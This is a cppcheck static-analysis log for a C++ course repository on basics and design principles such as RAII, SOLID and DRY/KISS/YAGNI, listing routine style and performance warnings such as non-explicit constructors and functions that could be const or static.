Checking D:\Work\Patterns\01-basics\lesson_1_1_hello_world\exploits\hello_world_exploits.cpp ...
1/194 files checked 0% done
Checking D:\Work\Patterns\01-basics\lesson_1_1_hello_world\hello_world.cpp ...
2/194 files checked 0% done
Checking D:\Work\Patterns\01-basics\lesson_1_1_hello_world\hello_world_vulnerabilities.cpp ...
3/194 files checked 0% done
Checking D:\Work\Patterns\01-basics\lesson_1_1_hello_world\modern_features.cpp ...
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\modern_features.cpp:59:11: style: Variable 'value' is reassigned a value before the old one has been used. [redundantAssignment]
    value = std::string("Hello Any");
          ^
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\modern_features.cpp:58:11: note: value is assigned
    value = 42;
          ^
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\modern_features.cpp:59:11: note: value is overwritten
    value = std::string("Hello Any");
          ^
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\modern_features.cpp:60:11: style: Variable 'value' is reassigned a value before the old one has been used. [redundantAssignment]
    value = std::vector<int>{1, 2, 3, 4, 5};
          ^
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\modern_features.cpp:59:11: note: value is assigned
    value = std::string("Hello Any");
          ^
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\modern_features.cpp:60:11: note: value is overwritten
    value = std::vector<int>{1, 2, 3, 4, 5};
          ^
4/194 files checked 1% done
Checking D:\Work\Patterns\01-basics\lesson_1_1_hello_world\secure_hello_world_alternatives.cpp ...
5/194 files checked 1% done
Checking D:\Work\Patterns\01-basics\lesson_1_2_raii\exploits\raii_exploits.cpp ...
6/194 files checked 1% done
Checking D:\Work\Patterns\01-basics\lesson_1_2_raii\raii_example.cpp ...
D:\Work\Patterns\01-basics\lesson_1_2_raii\raii_example.cpp:122:9: performance: Variable 'file_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        file_ = std::make_unique<std::fstream>(filename);
        ^
7/194 files checked 2% done
Checking D:\Work\Patterns\01-basics\lesson_1_2_raii\raii_vulnerabilities.cpp ...
8/194 files checked 3% done
Checking D:\Work\Patterns\01-basics\lesson_1_2_raii\resource_manager.cpp ...
D:\Work\Patterns\01-basics\lesson_1_2_raii\resource_manager.cpp:286:15: style: Variable 'db1' can be declared as reference to const [constVariableReference]
        auto& db1 = manager.addResource("Primary Database");
              ^
D:\Work\Patterns\01-basics\lesson_1_2_raii\resource_manager.cpp:287:15: style: Variable 'db2' can be declared as reference to const [constVariableReference]
        auto& db2 = manager.addResource("Secondary Database");
              ^
D:\Work\Patterns\01-basics\lesson_1_2_raii\resource_manager.cpp:288:15: style: Variable 'cache' can be declared as reference to const [constVariableReference]
        auto& cache = manager.addResource("Redis Cache");
              ^
9/194 files checked 3% done
Checking D:\Work\Patterns\01-basics\lesson_1_2_raii\secure_raii_alternatives.cpp ...
10/194 files checked 4% done
Checking D:\Work\Patterns\01-basics\lesson_1_3_smart_pointers\exploits\smart_pointers_exploits.cpp ...
11/194 files checked 4% done
Checking D:\Work\Patterns\01-basics\lesson_1_3_smart_pointers\secure_smart_pointers_alternatives.cpp ...
12/194 files checked 4% done
Checking D:\Work\Patterns\01-basics\lesson_1_3_smart_pointers\smart_pointers_vulnerabilities.cpp ...
13/194 files checked 5% done
Checking D:\Work\Patterns\01-basics\lesson_1_4_move_semantics\exploits\move_semantics_exploits.cpp ...
14/194 files checked 5% done
Checking D:\Work\Patterns\01-basics\lesson_1_4_move_semantics\move_semantics_vulnerabilities.cpp ...
15/194 files checked 5% done
Checking D:\Work\Patterns\01-basics\lesson_1_4_move_semantics\secure_move_semantics_alternatives.cpp ...
16/194 files checked 5% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:46:10: performance: inconclusive: Technically the member function 'BadFileLogger::log' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void log(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:59:10: performance: inconclusive: Technically the member function 'BadConsoleLogger::log' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void log(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:69:10: performance: inconclusive: Technically the member function 'BadEmailNotification::send' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void send(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:77:10: performance: inconclusive: Technically the member function 'BadSMSNotification::send' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void send(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:213:10: performance: inconclusive: Technically the member function 'ConsoleLogger::logWithTimestamp' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void logWithTimestamp(const std::string& level, const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:266:10: performance: inconclusive: Technically the member function 'DatabaseLogger::writeToDatabase' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void writeToDatabase(const std::string& level, const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:150:5: style: Class 'FileLogger' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    FileLogger(const std::string& path = "application.log") : logFilePath(path) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:227:5: style: Class 'DatabaseLogger' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    DatabaseLogger(const std::string& connStr = "database://localhost:5432/logs")
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:279:5: style: Class 'EmailNotificationService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    EmailNotificationService(const std::string& server = "smtp.gmail.com",
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:323:5: style: Class 'SMSNotificationService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SMSNotificationService(const std::string& smsProvider = "Twilio",
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:367:5: style: Class 'PushNotificationService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    PushNotificationService(const std::string& pushPlatform = "Firebase",
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:590:5: style: Class 'RedisCache' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    RedisCache(const std::string& redisHost = "localhost", int redisPort = 6379)
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:646:5: style: Class 'DataService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    DataService(std::unique_ptr<ICache> cachePtr) : cache(std::move(cachePtr)) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:547:13: style: Redundant checking of STL container element existence before removing it. [redundantIfRemove]
        if (cache.find(key) != cache.end()) {
            ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:711:24: style: Variable 'consoleLogger' is assigned a value that is never used. [unreadVariable]
    auto consoleLogger = std::make_unique<ConsoleLogger>();
                       ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:712:25: style: Variable 'databaseLogger' is assigned a value that is never used. [unreadVariable]
    auto databaseLogger = std::make_unique<DatabaseLogger>();
                        ^
17/194 files checked 7% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\exploits\solid_exploits.cpp ...
18/194 files checked 7% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp ...
19/194 files checked 8% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:75:5: style: Class 'BadSquare' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadSquare(int side) : BadRectangle(side, side) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:255:5: style: Class 'Square' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Square(double s) : side(s) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:284:5: style: Class 'Circle' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Circle(double r) : radius(r) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:349:5: style: Class 'EmailChannel' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    EmailChannel(const std::string& emailAddr) : email(emailAddr), configured(false) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:381:5: style: Class 'SMSChannel' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SMSChannel(const std::string& phone) : phoneNumber(phone), configured(false) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:413:5: style: Class 'PushNotificationChannel' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    PushNotificationChannel(const std::string& token) : deviceToken(token), configured(false) {}
    ^
20/194 files checked 10% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:75:10: performance: inconclusive: Technically the member function 'BadPaymentProcessor::processCreditCard' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processCreditCard(const PaymentRequest& request) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:81:10: performance: inconclusive: Technically the member function 'BadPaymentProcessor::processPayPal' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processPayPal(const PaymentRequest& request) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:87:10: performance: inconclusive: Technically the member function 'BadPaymentProcessor::processBankTransfer' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processBankTransfer(const PaymentRequest& request) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:94:10: performance: inconclusive: Technically the member function 'BadPaymentProcessor::processCryptocurrency' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processCryptocurrency(const PaymentRequest& request) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:170:10: style: inconclusive: Technically the member function 'CreditCardPayment::validateCard' can be const. [functionConst]
    bool validateCard() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:175:10: performance: inconclusive: Technically the member function 'CreditCardPayment::checkLimits' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool checkLimits(double amount) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:229:10: style: inconclusive: Technically the member function 'PayPalPayment::authenticate' can be const. [functionConst]
    bool authenticate() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:234:10: performance: inconclusive: Technically the member function 'PayPalPayment::checkBalance' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool checkBalance(double amount) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:289:10: style: inconclusive: Technically the member function 'BankTransferPayment::validateBankAccount' can be const. [functionConst]
    bool validateBankAccount() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:294:10: performance: inconclusive: Technically the member function 'BankTransferPayment::checkBankLimits' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool checkBankLimits(double amount) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:349:10: style: inconclusive: Technically the member function 'CryptocurrencyPayment::validateWallet' can be const. [functionConst]
    bool validateWallet() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:354:10: performance: inconclusive: Technically the member function 'CryptocurrencyPayment::checkCryptoBalance' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool checkCryptoBalance(double amount) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:409:10: style: inconclusive: Technically the member function 'ApplePayPayment::validateDevice' can be const. [functionConst]
    bool validateDevice() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:414:10: style: inconclusive: Technically the member function 'ApplePayPayment::biometricAuth' can be const. [functionConst]
    bool biometricAuth() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:459:10: style: inconclusive: Technically the member function 'PaymentProcessor::listSupportedPayments' can be const. [functionConst]
    void listSupportedPayments() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:508:27: performance: inconclusive: Technically the member function 'BadDataFilter::filter' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::vector<Employee> filter(const std::vector<Employee>& employees, FilterType type, const std::string& value) {
                          ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:637:42: performance: inconclusive: Technically the member function 'GoodDataFilter::filter' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::vector<BadDataFilter::Employee> filter(const std::vector<BadDataFilter::Employee>& employees,
                                         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:553:5: style: Class 'NameFilter' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    NameFilter(const std::string& pattern) : namePattern(pattern) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:605:5: style: Class 'DepartmentFilter' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    DepartmentFilter(const std::string& dept) : department(dept) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:622:5: style: Class 'SeniorityFilter' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SeniorityFilter(int years) : minYears(years) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:477:60: style: Consider using std::find_if algorithm instead of a raw loop. [useStlAlgorithm]
            if (strategy->getPaymentType() == paymentType) {
                                                           ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:645:47: style: Consider using std::any_of algorithm instead of a raw loop. [useStlAlgorithm]
                if (!criterion->matches(emp)) {
                                              ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:53:44: style: struct member 'PaymentRequest::metadata' is never used. [unusedStructMember]
        std::map<std::string, std::string> metadata;
                                           ^
21/194 files checked 11% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\secure_solid_alternatives.cpp ...
22/194 files checked 11% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp ...
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:50:10: style: inconclusive: Technically the member function 'BadUserManager::validateUser' can be const. [functionConst]
    bool validateUser() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:61:10: style: inconclusive: Technically the member function 'BadUserManager::sendWelcomeEmail' can be const. [functionConst]
    void sendWelcomeEmail() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:66:10: style: inconclusive: Technically the member function 'BadUserManager::logUserCreation' can be const. [functionConst]
    void logUserCreation() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:72:10: style: inconclusive: Technically the member function 'BadUserManager::saveToDatabase' can be const. [functionConst]
    void saveToDatabase() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:204:10: performance: inconclusive: Technically the member function 'BadPaymentProcessor::processPayment' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void processPayment(PaymentType type, double amount) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:561:10: performance: inconclusive: Technically the member function 'BadFileLogger::log' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void log(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:568:10: performance: inconclusive: Technically the member function 'BadEmailNotification::send' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void send(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:332:5: style: Class 'BadSquare' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadSquare(int side) : Rectangle(side, side) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:391:5: style: Class 'GoodSquare' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    GoodSquare(double s) : side(s) {}
    ^
23/194 files checked 13% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_vulnerabilities.cpp ...
24/194 files checked 13% done
Checking D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:76:10: style: inconclusive: Technically the member function 'BadOrderManager::validateOrder' can be const. [functionConst]
    bool validateOrder() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:119:10: style: inconclusive: Technically the member function 'BadOrderManager::sendConfirmationEmail' can be const. [functionConst]
    void sendConfirmationEmail() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:127:10: style: inconclusive: Technically the member function 'BadOrderManager::saveToDatabase' can be const. [functionConst]
    void saveToDatabase() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:133:10: style: inconclusive: Technically the member function 'BadOrderManager::generateReport' can be const. [functionConst]
    void generateReport() {
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:264:19: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
            total += getItemPrice(item);
                  ^
25/194 files checked 14% done
Checking D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:326:10: style: inconclusive: Technically the member function 'ValidationManager::validateAll' can be const. [functionConst]
    bool validateAll(const std::map<std::string, std::string>& data) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:346:10: style: inconclusive: Technically the member function 'ValidationManager::printSummary' can be const. [functionConst]
    void printSummary() {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:275:5: style: Class 'PasswordValidator' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    PasswordValidator(int minLen = 8, bool upper = true, bool lower = true,
    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:430:16: style: inconclusive: Found duplicate branches for 'if' and 'else'. [duplicateBranch]
        } else if (format == "date") {
               ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:433:11: note: Found duplicate branches for 'if' and 'else'.
        } else {
          ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:430:16: note: Found duplicate branches for 'if' and 'else'.
        } else if (format == "date") {
               ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:81:34: style: Consider using std::any_of algorithm instead of a raw loop. [useStlAlgorithm]
            if (std::isdigit(c)) {
                                 ^
26/194 files checked 15% done
Checking D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_kiss_yagni_vulnerabilities.cpp ...
27/194 files checked 15% done
Checking D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\exploits\dry_kiss_yagni_exploits.cpp ...
28/194 files checked 16% done
Checking D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:57:5: warning: Member variable 'BadConfigNode::intValue' is not initialized in the constructor. [uninitMemberVar]
    BadConfigNode(NodeType nodeType) : type(nodeType) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:57:5: warning: Member variable 'BadConfigNode::boolValue' is not initialized in the constructor. [uninitMemberVar]
    BadConfigNode(NodeType nodeType) : type(nodeType) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:143:9: performance: Variable 'root' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        root = std::make_unique<BadConfigNode>(BadConfigNode::NodeType::OBJECT);
        ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:338:9: performance: Variable 'timestamp' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        timestamp = std::chrono::system_clock::now();
        ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:211:30: performance: inconclusive: Technically the member function 'BadConfigManager::splitPath' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::vector<std::string> splitPath(const std::string& path) const {
                             ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:428:10: performance: inconclusive: Technically the member function 'BadNotificationProcessor::processEmailNotification' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processEmailNotification(const BadNotificationEvent& notification) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:433:10: performance: inconclusive: Technically the member function 'BadNotificationProcessor::processSMSNotification' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processSMSNotification(const BadNotificationEvent& notification) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:438:10: performance: inconclusive: Technically the member function 'BadNotificationProcessor::processPushNotification' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processPushNotification(const BadNotificationEvent& notification) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:443:10: performance: inconclusive: Technically the member function 'BadNotificationProcessor::processInAppNotification' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processInAppNotification(const BadNotificationEvent& notification) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:448:10: performance: inconclusive: Technically the member function 'BadNotificationProcessor::processWebhookNotification' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool processWebhookNotification(const BadNotificationEvent& notification) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:466:10: style: inconclusive: Technically the member function 'SimpleNotification::send' can be const. [functionConst]
    void send() {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:57:5: style: Class 'BadConfigNode' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadConfigNode(NodeType nodeType) : type(nodeType) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:618:5: style: Class 'SimpleCache < std :: string , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SimpleCache(size_t maximumSize = 100) : maxSize(maximumSize) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:559:5: style: Class 'BadCache < std :: string , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadCache(size_t maximumSize = 1000, std::chrono::seconds defaultTimeToLive = std::chrono::hours(1))
    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:364:17: performance: Function 'getId()' should return member 'id' by const reference. [returnByReference]
    std::string getId() const { return id; }
                ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:365:17: performance: Function 'getTitle()' should return member 'title' by const reference. [returnByReference]
    std::string getTitle() const { return title; }
                ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:366:17: performance: Function 'getMessage()' should return member 'message' by const reference. [returnByReference]
    std::string getMessage() const { return message; }
                ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:165:24: style: Variable 'node' can be declared as pointer to const [constVariablePointer]
        BadConfigNode* node = getNode(path);
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:170:24: style: Variable 'node' can be declared as pointer to const [constVariablePointer]
        BadConfigNode* node = getNode(path);
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:175:24: style: Variable 'node' can be declared as pointer to const [constVariablePointer]
        BadConfigNode* node = getNode(path);
                       ^
29/194 files checked 17% done
Checking D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\principles_comparison.cpp ...
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\principles_comparison.cpp:266:10: style: inconclusive: Technically the member function 'OverDRYForYAGNI::processAll' can be const. [functionConst]
    void processAll() {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\principles_comparison.cpp:201:9: style: Class 'UserDataProcessor' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        UserDataProcessor(const std::string& userData) : data(userData) {}
        ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\principles_comparison.cpp:228:9: style: Class 'ProductDataProcessor' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        ProductDataProcessor(const std::string& productData) : data(productData) {}
        ^
30/194 files checked 18% done
Checking D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\secure_dry_kiss_yagni_alternatives.cpp ...
31/194 files checked 18% done
Checking D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:277:9: performance: Variable 'stats' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        stats = {0, 0, 0, 0.0, std::chrono::milliseconds(0)};
        ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:175:10: performance: inconclusive: Technically the member function 'BadNotificationSystem::generateAnalytics' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void generateAnalytics() {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:180:10: performance: inconclusive: Technically the member function 'BadNotificationSystem::exportRecipients' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void exportRecipients(const std::string& filename) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:185:10: performance: inconclusive: Technically the member function 'BadNotificationSystem::importTemplates' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void importTemplates(const std::string& filename) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:191:10: performance: inconclusive: Technically the member function 'BadNotificationSystem::sendToRecipient' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void sendToRecipient(const NotificationTemplate& template,
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:217:10: style: inconclusive: Technically the member function 'SimpleNotificationSystem::sendNotification' can be const. [functionConst]
    void sendNotification(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:636:10: performance: inconclusive: Technically the member function 'SimpleLogger::log' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void log(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:374:10: performance: inconclusive: Technically the member function 'BadAdvancedCache < std :: string , std :: string >::persistToFile' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void persistToFile(const std::string& filename) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:379:10: performance: inconclusive: Technically the member function 'BadAdvancedCache < std :: string , std :: string >::loadFromFile' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void loadFromFile(const std::string& filename) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:556:5: style: Class 'BadLogger' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadLogger(OutputFormat outputFormat = OutputFormat::PLAIN_TEXT,
    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:480:5: style: Class 'SimpleCache < std :: string , std :: string >' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SimpleCache(size_t size = 100) : maxSize(size) {
    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:354:21: performance: Function 'getStatistics()' should return member 'stats' by const reference. [returnByReference]
    CacheStatistics getStatistics() const {
                    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:64:44: style: struct member 'NotificationTemplate::variables' is never used. [unusedStructMember]
        std::map<std::string, std::string> variables;
                                           ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:72:21: style: struct member 'NotificationRecipient::email' is never used. [unusedStructMember]
        std::string email;
                    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:73:21: style: struct member 'NotificationRecipient::phone' is never used. [unusedStructMember]
        std::string phone;
                    ^
